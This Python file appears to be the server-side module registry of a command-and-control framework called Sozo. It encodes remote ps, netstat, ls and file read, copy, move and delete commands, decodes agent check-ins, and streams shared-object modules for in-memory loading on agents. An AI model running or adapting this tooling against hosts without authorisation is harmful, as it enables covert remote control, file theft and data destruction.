"""
modules.py — Sozo module registry
"""

from __future__ import annotations

import ipaddress
import struct
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Optional

# ---------------------------------------------------------------------------
# Module identities
# ---------------------------------------------------------------------------
COMMS = 0xFF3A7C12
SHELL = 0xFF8B2E45
LOADER = 0xFF2E81A7

# ---------------------------------------------------------------------------
# Shell opcodes
# ---------------------------------------------------------------------------
SHELL_OP_PS = 0x00
SHELL_OP_NETSTAT = 0x01
SHELL_OP_LIST = 0x02

# ---------------------------------------------------------------------------
# FileOps opcodes  (mirrors file_ops.rs FileOpsCommands repr u8)
# ---------------------------------------------------------------------------
FILEOPS_OP_CAT = 0x00
FILEOPS_OP_COPY = 0x01
FILEOPS_OP_REMOVE = 0x02
FILEOPS_OP_MOVE = 0x03

# ---------------------------------------------------------------------------
# Error code tables
# ---------------------------------------------------------------------------
SHELL_ERRORS = {
    0: "Success",
    1: "Critical",
    2: "UnableToOpenDir",
    3: "UnableToOpenFile",
    4: "PermissionDenied",
    5: "InvalidArguments",
    6: "PathNotFound",
    7: "Unknown",
}

FILEOPS_ERRORS = {
    0: "Success",
    1: "Critical",
    2: "PermissionDenied",
    3: "InvalidArguments",
    4: "PathNotFound",
    5: "ReadError",
    6: "NotRegularFile",
    7: "UnableToOpenFile",
    8: "UnableToEnumerate",
    9: "Unknown",
}

LOAD_ERRORS = {
    0: "Success",
    1: "Critical",
    2: "Waiting",
    3: "InvalidLength",
    4: "UnableToMemCreate",
    5: "UnableToWrite",
    6: "UnableToDlOpen",
    7: "ExportNotFound",
    8: "UnableToCreateInstance",
}

# ---------------------------------------------------------------------------
# Module paths
# ---------------------------------------------------------------------------
MODULES_DIR = Path("./modules")

# ---------------------------------------------------------------------------
# Dynamic module registry
# NOTE: loaded_modules is intentionally NOT stored here as a global.
# Each QUIC connection (SozoServerProtocol) maintains its own per-connection
# loaded_modules dict so that a module loaded on connection A is not
# incorrectly assumed to be loaded on connection B.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Loadable module table
# ---------------------------------------------------------------------------
LOADABLE_MODULES: dict[str, str] = {
    "cat": "file_ops",
    "copy": "file_ops",
    "remove": "file_ops",
    "move": "file_ops",
}

# ---------------------------------------------------------------------------
# Command map
# ---------------------------------------------------------------------------


def _shell_payload(opcode: int, args: bytes = b"") -> bytes:
    return bytes([opcode]) + args


def _ls_payload(args: str) -> bytes:
    path = (args.strip() or ".").encode("utf-8")
    return bytes([SHELL_OP_LIST]) + struct.pack(">H", len(path)) + path


def _fileops_payload(opcode: int, args: str) -> bytes:
    """opcode(u8) + path_len(u16 big-endian) + path bytes."""
    path = args.strip().encode("utf-8")
    return bytes([opcode]) + struct.pack(">H", len(path)) + path


def _remove_payload(args: str) -> bytes:
    """
    Remove payload: u8 opcode + u8 dir_flag + u16 path_len + path bytes.
    User passes --dir flag to remove a directory, e.g. "remove --dir /tmp/foo".
    dir_flag is 1 if --dir present, 0 otherwise.
    """
    parts = args.strip().split()
    is_dir = 1 if "--dir" in parts else 0
    parts = [p for p in parts if p != "--dir"]
    path = (" ".join(parts)).encode("utf-8")
    return bytes([FILEOPS_OP_REMOVE, is_dir]) + struct.pack(">H", len(path)) + path


def _fileops_two_path_payload(opcode: int, args: str) -> bytes:
    """
    opcode(u8) + src_len(u16) + dst_len(u16) + src bytes + dst bytes.
    args is expected as "src dst" (space-separated, first token = src).
    """
    parts = args.strip().split(None, 1)
    if len(parts) != 2:
        # Malformed — send empty paths so the agent returns InvalidArguments
        return bytes([opcode]) + struct.pack(">HH", 0, 0)
    src = parts[0].encode("utf-8")
    dst = parts[1].encode("utf-8")
    return bytes([opcode]) + struct.pack(">HH", len(src), len(dst)) + src + dst


COMMAND_MAP: dict[str, tuple[int, Callable[[str], bytes]]] = {
    "ps": (SHELL, lambda args: _shell_payload(SHELL_OP_PS)),
    "netstat": (SHELL, lambda args: _shell_payload(SHELL_OP_NETSTAT)),
    "ls": (SHELL, lambda args: _ls_payload(args)),
}


def register_loaded_module(
    module_name: str,
    identity: int,
    command_map: dict,
    decoders: dict,
    loaded_modules: dict,
) -> None:
    """
    Register a dynamically loaded module into the per-connection registries.
    All three dicts are owned by the SozoServerProtocol instance so that
    each connection has an independent view of which modules are loaded.
    """
    loaded_modules[module_name] = identity
    if module_name == "file_ops":
        command_map["cat"] = (
            identity,
            lambda args: _fileops_payload(FILEOPS_OP_CAT, args),
        )
        command_map["copy"] = (
            identity,
            lambda args: _fileops_two_path_payload(FILEOPS_OP_COPY, args),
        )
        command_map["remove"] = (identity, lambda args: _remove_payload(args))
        command_map["move"] = (
            identity,
            lambda args: _fileops_two_path_payload(FILEOPS_OP_MOVE, args),
        )
        decoders[identity] = {
            FILEOPS_OP_CAT: _decode_cat,
            FILEOPS_OP_COPY: _decode_fileops_status,
            FILEOPS_OP_REMOVE: _decode_fileops_status,
            FILEOPS_OP_MOVE: _decode_fileops_status,
        }


def resolve_command(
    cmd_text: str,
    command_map: dict | None = None,
) -> tuple[int, bytes] | tuple[str, str] | None:
    """
    Resolve a command string to (identity, payload) or ("load_required", name).
    Pass the per-connection command_map to include dynamically loaded modules.
    Falls back to the static COMMAND_MAP if none provided.
    """
    parts = cmd_text.strip().split(None, 1)
    verb = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""
    # Check per-connection map first (loaded modules), then static map
    effective_map = {**COMMAND_MAP, **(command_map or {})}
    entry = effective_map.get(verb)
    if entry is not None:
        identity, builder = entry
        return identity, builder(args)
    module_name = LOADABLE_MODULES.get(verb)
    if module_name is not None:
        # Only return load_required if not already loaded on this connection
        if command_map is None or verb not in command_map:
            return ("load_required", module_name)
    return None


# ---------------------------------------------------------------------------
# Retcode name resolver — checks module-specific table first
# ---------------------------------------------------------------------------


def retcode_name(
    module_identity: int,
    retcode: int,
    loaded_modules: dict | None = None,
) -> str:
    if loaded_modules and module_identity in loaded_modules.values():
        name = FILEOPS_ERRORS.get(retcode)
        if name is not None:
            return name
    return SHELL_ERRORS.get(retcode, f"0x{retcode:02X}")


# ---------------------------------------------------------------------------
# Module loader
# ---------------------------------------------------------------------------
LOAD_CHUNK_SIZE = 4096


def build_load_packets(module_name: str) -> list[bytes] | None:
    so_path = MODULES_DIR / f"{module_name}.so"
    if not so_path.exists():
        return None
    data = so_path.read_bytes()
    total = len(data)
    packets: list[bytes] = [struct.pack(">I", total)]
    offset = 0
    while offset < total:
        chunk = data[offset : offset + LOAD_CHUNK_SIZE]
        packets.append(chunk)
        offset += len(chunk)
    return packets


def parse_load_response(data: bytes) -> tuple[int, int | None]:
    if len(data) < 1:
        return (255, None)
    retcode = data[0]
    if retcode != 0:
        return (retcode, None)
    if len(data) < 5:
        return (retcode, None)
    identity = struct.unpack_from(">I", data, 1)[0]
    return (retcode, identity)


# ---------------------------------------------------------------------------
# Response wire format constants
# ---------------------------------------------------------------------------
INIT_HDR_FMT = ">QBHHI"
INIT_HDR_SIZE = struct.calcsize(INIT_HDR_FMT)  # 17
CONT_HDR_FMT = ">HHI"
CONT_HDR_SIZE = struct.calcsize(CONT_HDR_FMT)  # 8


# ---------------------------------------------------------------------------
# Chunk reassembly
# ---------------------------------------------------------------------------
@dataclass
class ChunkBuffer:
    total_data_len: int = 0
    retcode: int = 0
    total_chunks: int = 0
    chunks: dict = field(default_factory=dict)

    @property
    def complete(self) -> bool:
        return len(self.chunks) == self.total_chunks and self.total_chunks > 0

    @property
    def data(self) -> bytes:
        return b"".join(self.chunks[i] for i in range(self.total_chunks))


def parse_initial_chunk(raw: bytes) -> tuple | None:
    if len(raw) < INIT_HDR_SIZE:
        return None
    total_data_len, retcode, chunk_idx, total_chunks, data_len = struct.unpack_from(
        INIT_HDR_FMT, raw
    )
    if chunk_idx != 0:
        return None
    return (
        total_chunks,
        retcode,
        raw[INIT_HDR_SIZE : INIT_HDR_SIZE + data_len],
        total_data_len,
    )


def parse_continuation_chunk(raw: bytes) -> tuple | None:
    if len(raw) < CONT_HDR_SIZE:
        return None
    chunk_idx, total_chunks, data_len = struct.unpack_from(CONT_HDR_FMT, raw)
    return (chunk_idx, total_chunks, raw[CONT_HDR_SIZE : CONT_HDR_SIZE + data_len])


# ---------------------------------------------------------------------------
# Decoders
# ---------------------------------------------------------------------------


def _decode_ps(data: bytes) -> dict:
    if len(data) < 4:
        return {"cmd": "ps", "error": "truncated data", "processes": []}
    offset = 4
    processes = []
    PROC_FIXED = 19
    while offset < len(data):
        if offset + PROC_FIXED > len(data):
            return {
                "cmd": "ps",
                "error": f"truncated at header (offset {offset})",
                "processes": processes,
            }
        pid, ppid, stime = struct.unpack_from(">IIQ", data, offset)
        offset += 16
        user_len, tty_len, exe_len = struct.unpack_from(">BBB", data, offset)
        offset += 3
        needed = user_len + tty_len + exe_len
        if offset + needed > len(data):
            return {
                "cmd": "ps",
                "error": f"truncated at strings (offset {offset})",
                "processes": processes,
            }
        user = data[offset : offset + user_len].decode("utf-8", errors="replace")
        offset += user_len
        tty = data[offset : offset + tty_len].decode("utf-8", errors="replace")
        offset += tty_len
        exe = data[offset : offset + exe_len].decode("utf-8", errors="replace")
        offset += exe_len
        processes.append(
            {
                "pid": pid,
                "ppid": ppid,
                "stime": stime,
                "user": user,
                "tty": tty,
                "exe": exe,
            }
        )
    return {"cmd": "ps", "processes": processes}


def _decode_netstat(data: bytes) -> dict:
    if len(data) < 4:
        return {"cmd": "netstat", "error": "truncated data", "connections": []}
    CONN_FIXED = 14
    PROTO_NAMES = {0: "TCP", 1: "UDP", 2: "TCP6", 3: "UDP6"}
    TCP_STATES = {
        0x01: "ESTABLISHED",
        0x02: "SYN_SENT",
        0x03: "SYN_RECV",
        0x04: "FIN_WAIT1",
        0x05: "FIN_WAIT2",
        0x06: "TIME_WAIT",
        0x07: "CLOSE",
        0x08: "CLOSE_WAIT",
        0x09: "LAST_ACK",
        0x0A: "LISTEN",
        0x0B: "CLOSING",
        0x00: "",
    }
    offset = 4
    connections = []
    while offset < len(data):
        if offset + CONN_FIXED > len(data):
            return {
                "cmd": "netstat",
                "error": f"truncated at header (offset {offset})",
                "connections": connections,
            }
        protocol = data[offset]
        offset += 1
        local_addr_len = data[offset]
        offset += 1
        (local_port,) = struct.unpack_from(">H", data, offset)
        offset += 2
        remote_addr_len = data[offset]
        offset += 1
        (remote_port,) = struct.unpack_from(">H", data, offset)
        offset += 2
        state = data[offset]
        offset += 1
        (pid,) = struct.unpack_from(">I", data, offset)
        offset += 4
        exe_len = data[offset]
        offset += 1
        user_len = data[offset]
        offset += 1
        needed = local_addr_len + remote_addr_len + exe_len + user_len
        if offset + needed > len(data):
            return {
                "cmd": "netstat",
                "error": f"truncated at data (offset {offset})",
                "connections": connections,
            }
        local_addr_bytes = data[offset : offset + local_addr_len]
        offset += local_addr_len
        remote_addr_bytes = data[offset : offset + remote_addr_len]
        offset += remote_addr_len
        exe = data[offset : offset + exe_len].decode("utf-8", errors="replace")
        offset += exe_len
        user = data[offset : offset + user_len].decode("utf-8", errors="replace")
        offset += user_len

        def fmt_addr(raw: bytes) -> str:
            try:
                if len(raw) == 4:
                    return str(ipaddress.IPv4Address(bytes(reversed(raw))))
                elif len(raw) == 16:
                    words = struct.unpack_from(">IIII", raw)
                    return str(
                        ipaddress.IPv6Address(
                            b"".join(struct.pack("<I", w) for w in words)
                        )
                    )
                return raw.hex()
            except Exception:
                return raw.hex()

        is_udp = protocol in (1, 3)
        state_str = (
            ("ESTABLISHED" if state == 0x01 else "-")
            if is_udp
            else TCP_STATES.get(state, f"0x{state:02X}")
        )
        connections.append(
            {
                "proto": PROTO_NAMES.get(protocol, str(protocol)),
                "local_addr": fmt_addr(local_addr_bytes),
                "local_port": local_port,
                "remote_addr": fmt_addr(remote_addr_bytes),
                "remote_port": remote_port,
                "state": state_str,
                "pid": pid if pid != 0 else None,
                "exe": exe if exe != "-" else None,
                "user": user,
            }
        )
    return {"cmd": "netstat", "connections": connections}


def _decode_ls(data: bytes) -> dict:
    if len(data) < 4:
        return {"cmd": "ls", "error": "truncated data", "entries": []}
    ENTRY_FIXED = 50
    offset = 4
    entries = []
    while offset < len(data):
        if offset + ENTRY_FIXED > len(data):
            return {
                "cmd": "ls",
                "error": f"truncated at header (offset {offset})",
                "entries": entries,
            }
        (
            permissions,
            inode,
            link_count,
            user_len,
            group_len,
            size,
            mtime,
            ctime,
            fn_len,
            link_len,
        ) = struct.unpack_from(">IQQBBQQQhh", data, offset)
        fn_len = fn_len & 0xFFFF
        link_len = link_len & 0xFFFF
        offset += ENTRY_FIXED
        needed = user_len + group_len + fn_len + link_len
        if offset + needed > len(data):
            return {
                "cmd": "ls",
                "error": f"truncated at data (offset {offset})",
                "entries": entries,
            }
        user = data[offset : offset + user_len].decode("utf-8", errors="replace")
        offset += user_len
        group = data[offset : offset + group_len].decode("utf-8", errors="replace")
        offset += group_len
        filename = data[offset : offset + fn_len].decode("utf-8", errors="replace")
        offset += fn_len
        link = (
            data[offset : offset + link_len].decode("utf-8", errors="replace")
            if link_len
            else None
        )
        offset += link_len
        entries.append(
            {
                "permissions": permissions,
                "inode": inode,
                "link_count": link_count,
                "user": user,
                "group": group,
                "size": size,
                "mtime": mtime,
                "ctime": ctime,
                "filename": filename,
                "link": link,
            }
        )
    return {"cmd": "ls", "entries": entries}


def _decode_cat(data: bytes) -> dict:
    """
    Cat response wire format:
      u64  file_size   (8 bytes, big-endian)
      [file_size bytes of raw file content]
    """
    if not data:
        return {"cmd": "cat", "error": "empty response", "content": ""}

    if len(data) < 8:
        return {
            "cmd": "cat",
            "error": f"truncated header ({len(data)}B)",
            "content": "",
        }

    file_size = struct.unpack_from(">Q", data, 0)[0]
    content_bytes = data[8:]

    if len(content_bytes) < file_size:
        return {
            "cmd": "cat",
            "error": f"truncated content: expected {file_size}B got {len(content_bytes)}B",
            "content": "",
        }

    # Trim to declared size (ignore any trailing padding)
    content_bytes = content_bytes[:file_size]

    if not content_bytes:
        return {"cmd": "cat", "content": "", "binary": False, "size": 0}

    try:
        content = content_bytes.decode("utf-8")
        binary = False
    except UnicodeDecodeError:
        content = content_bytes.decode("latin-1")
        binary = True

    return {"cmd": "cat", "content": content, "binary": binary, "size": file_size}


def _decode_fileops_status(data: bytes) -> dict:
    """
    Copy / remove / move response.
    On success: retcode=0, no additional data (0 bytes or just the header).
    On failure: retcode != 0.
    """
    if not data:
        # Zero bytes after header strip = success (retcode implicit 0)
        return {"cmd": "fileops", "retcode": 0, "success": True, "error": None}
    retcode = data[0]
    return {
        "cmd": "fileops",
        "retcode": retcode,
        "success": retcode == 0,
        "error": (
            None if retcode == 0 else FILEOPS_ERRORS.get(retcode, f"0x{retcode:02X}")
        ),
    }


def _decode_checkin(data: bytes) -> dict:
    if len(data) < 4:
        return {"error": "truncated checkin"}
    offset = 4
    fields = {}
    for key in ("user", "hostname", "arch", "version"):
        if offset >= len(data):
            return {"error": f"truncated at field '{key}'", **fields}
        length = data[offset]
        offset += 1
        if offset + length > len(data):
            return {"error": f"truncated reading field '{key}'", **fields}
        fields[key] = (
            data[offset : offset + length].decode("utf-8", errors="replace").strip()
        )
        offset += length
    if offset + 4 <= len(data):
        fields["pid"] = struct.unpack_from(">I", data, offset)[0]
    else:
        return {"error": "truncated at pid field", **fields}
    return {"cmd": "checkin", **fields}


# ---------------------------------------------------------------------------
# Decoder registry
# ---------------------------------------------------------------------------
DECODERS: dict[int, dict[int, Callable[[bytes], dict]]] = {
    SHELL: {
        -1: _decode_checkin,
        SHELL_OP_PS: _decode_ps,
        SHELL_OP_NETSTAT: _decode_netstat,
        SHELL_OP_LIST: _decode_ls,
    },
}


def decode_response(
    module_identity: int,
    opcode: int,
    data: bytes,
    decoders: dict | None = None,
) -> dict:
    """
    Decode a reassembled response. Pass the per-connection decoders dict
    to include dynamically loaded module decoders.
    """
    effective = {**DECODERS, **(decoders or {})}
    module_decoders = effective.get(module_identity, {})
    decoder = module_decoders.get(opcode)
    if decoder:
        try:
            return decoder(data)
        except Exception as e:
            return {"error": f"decode exception: {e}", "raw": data[:256].hex()}
    return {
        "error": f"no decoder for module {hex(module_identity)} opcode {opcode}",
        "raw": data[:256].hex(),
    }
